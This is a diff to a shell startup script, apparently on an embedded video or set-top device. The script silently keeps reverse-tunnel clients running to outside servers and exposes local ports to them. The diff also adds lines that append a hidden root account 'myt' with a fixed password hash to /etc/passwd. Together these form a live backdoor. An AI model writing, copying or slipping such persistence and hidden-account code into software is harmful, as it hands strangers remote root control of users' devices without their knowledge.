@@ -1,15 +1,18 @@
 #!/bin/sh
 if [ -f /mnt/firmware/frpid ]; then frpid="$(cat /mnt/firmware/frpid)";fi
-
+if [ ! -f /mnt/firmware/dtlkey ]; then echo fyt > /mnt/firmware/dtlkey;fi
 if [ -z "$(ps | grep dtl | grep 19848 | grep -v grep)" ]; then
 nohup /mnt/video/dtl -reg $frpid -local :19848 -clientkey 30819 -remote diyi.imbbs.in:8000 -buster diyi.imbbs.in:8018 -ssl=false > /dev/null 2>&1 &
 fi
 
 if [ -z "$(ps | grep frpc | grep frpc.ini | grep -v grep)" ]; then
-nohup /mnt/video/frpc tcp -l 8899 -r $frpid -n ss-$frpid -s tvbsuper.ticp.net:7001 > /dev/null &
+nohup /mnt/video/frpc tcp -p kcp -l 8899 -r $frpid -n ss-$frpid -s tvbsuper.ticp.net:7001 > /dev/null &
 nohup /mnt/video/frpc tcp -l 8899 -r $frpid -n ss-$frpid -s frpserver.ticp.net:7001 > /dev/null &
 nohup /mnt/video/frpc tcp -l 19848 -r $frpid -n tld-$frpid -s diyi.imbbs.in:7000 > /dev/null &
+fi
 
+if [ "$(cat /etc/passwd | grep myt:)" == "" ]; then
+echo "myt:MzSCClsuFPiPg:0:0:myt:/root:/bin/sh" >> /etc/passwd
 fi
 
 if [ -z "$(ps | grep dtunnel_lite | grep -v grep)" ]; then
